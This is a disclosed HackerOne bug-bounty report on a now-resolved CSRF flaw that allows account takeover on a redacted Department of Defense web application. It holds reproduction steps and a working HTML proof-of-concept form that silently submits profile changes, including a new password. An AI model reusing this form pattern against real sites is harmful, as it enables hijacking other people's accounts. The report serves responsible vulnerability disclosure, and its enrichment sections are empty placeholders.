---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '670924'
original_report_id: '670924'
title: Account takeover through CSRF in http://███████/██████████/default.asp
weakness: Cross-Site Request Forgery (CSRF)
team_handle: deptofdefense
created_at: '2019-08-10T08:35:05.196Z'
disclosed_at: '2020-06-11T18:21:33.569Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 39
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Account takeover through CSRF in http://███████/██████████/default.asp

## Metadata

- HackerOne Report ID: 670924
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: deptofdefense
- Disclosed At: 2020-06-11T18:21:33.569Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Hi team,

I have found a CSRF vulnerability in http://██████/████/default.asp that leads to account takeover.

## Step-by-step Reproduction Instructions

1. Go to http://██████████/████████/default.asp and login
2. Copy the below HTML code
3. Submit the request and see your profile
4. Try to login again with your username and password
5. Use the password `██████████`. You will be logged in with `████` as a password.


**HTML code:**
```
<html>
  <body>
    <form action="http://██████████/█████████/myprofile.asp?update=yes" method="POST">
      <input type="hidden" name="txtFName" value="███" />
      <input type="hidden" name="txtMI" value="By" />
      <input type="hidden" name="txtLName" value="█████████" />
      <input type="hidden" name="txtTitle" value="" />
      <input type="hidden" name="txtOrganization" value="H1" />
      <input type="hidden" name="txtEmail" value="██████████" />
      <input type="hidden" name="txtPhone" value="" />
      <input type="hidden" name="txtFax" value="" />
      <input type="hidden" name="txtStreet1" value="██████████" />
      <input type="hidden" name="txtStreet2" value="" />
      <input type="hidden" name="txtCity" value="" />
      <input type="hidden" name="state" value="NULL" />
      <input type="hidden" name="txtZip" value="" />
      <input type="hidden" name="txtPassword" value="███" />
      <input type="hidden" name="txtVeriPW" value="█████" />
      <input type="hidden" name="submit1" value="Submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

## Impact

Complete account takeover

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
